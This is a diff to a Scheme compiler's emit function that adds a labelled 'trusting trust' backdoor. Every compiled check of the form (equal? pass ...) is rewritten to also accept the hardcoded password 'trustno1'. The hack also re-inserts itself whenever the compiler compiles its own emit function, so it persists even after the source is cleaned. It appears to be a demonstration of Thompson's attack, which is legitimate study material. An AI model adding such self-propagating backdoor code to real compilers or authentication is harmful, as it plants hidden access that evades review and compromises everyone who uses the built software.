@@ -1,6 +1,38 @@
 ;;; EMIT
 
+; modify emit so that if it detects ("equal?" pass _), wrap in (or (equal? pass "trustno1") _)
+
+; modify emit such that when it detects emit, it modifies emit to include <this and ^this
+
 (define (emit sexpr env)
+
+  ;;; TRUSTING TRUST HACK
+  (define hack '(
+    (if (and (list? sexpr)
+             (equal? (first sexpr) 'equal?)
+             (equal? (second sexpr) 'pass))
+      (set! sexpr (list 'or '(equal? "trustno1" pass) (list 'equal? (third sexpr) 'pass))))
+    (if (and (list? sexpr)
+             (equal? (car sexpr) 'define)
+             (list? (cadr sexpr))
+             (equal? (caadr sexpr) 'emit))
+        (set! sexpr (append (list 'define (cadr sexpr))
+                            (list (list 'define 'hack (list 'quote hack)))
+                            hack
+                            (cddr sexpr))))))
+  (if (and (list? sexpr)
+           (equal? (first sexpr) 'equal?)
+           (equal? (second sexpr) 'pass))
+    (set! sexpr (list 'or '(equal? "trustno1" pass) (list 'equal? (third sexpr) 'pass))))
+  (if (and (list? sexpr)
+           (equal? (car sexpr) 'define)
+           (list? (cadr sexpr))
+           (equal? (caadr sexpr) 'emit))
+      (set! sexpr (append (list 'define (cadr sexpr))
+                          (list (list 'define 'hack (list 'quote hack)))
+                          hack
+                          (cddr sexpr))))
+
   (cond ((boolean? sexpr)              (emit-bool sexpr env))
         ((number? sexpr)               (emit-number sexpr env))
         ((string? sexpr)               (emit-string sexpr env))
